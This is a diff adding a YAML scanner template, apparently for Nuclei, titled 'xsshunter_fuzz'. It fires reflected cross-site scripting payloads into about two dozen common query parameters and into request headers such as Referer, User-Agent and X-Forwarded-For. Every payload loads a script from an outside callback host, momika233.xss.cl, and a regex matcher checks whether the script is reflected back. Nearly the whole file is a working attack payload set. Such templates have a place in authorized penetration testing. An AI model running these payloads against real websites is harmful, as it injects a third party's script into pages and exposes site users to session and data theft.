@@ -1,0 +1,59 @@
+id: xsshunter_fuzz
+
+info:
+  name: xsshunter_fuzz
+  author: momika233(https://twitter.com/momika233)
+  severity: high
+  reference:
+    - https://xsshunter.com/
+  tags: xsshunter_fuzz
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?q"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?s"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?search"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?id"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?lang"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?query"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?page"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?keywords"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?year"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?view"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?email"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?type"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?name"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?p"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?month"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?immagine"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?list_type"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?url"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?terms"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?categoryid"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?key"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?l"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?begindate"><script%20src=https://momika233.xss.cl></script>'
+      - '{{BaseURL}}/?enddate"><script%20src=https://momika233.xss.cl></script>'
+
+
+    headers:
+      X-Client-IP: <script src=https://momika233.xss.cl></script>
+      X-Remote-IP: <script src=https://momika233.xss.cl></script>
+      X-Remote-Addr: <script src=https://momika233.xss.cl></script>
+      X-Forwarded-For: <script src=https://momika233.xss.cl></script>
+      X-Originating-IP: <script src=https://momika233.xss.cl></script>
+      Referer: <script src=https://momika233.xss.cl></script>
+      Origin: <script src=https://momika233.xss.cl></script>
+      User-Agent: <script src=https://momika233.xss.cl></script>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "script.*momika233"
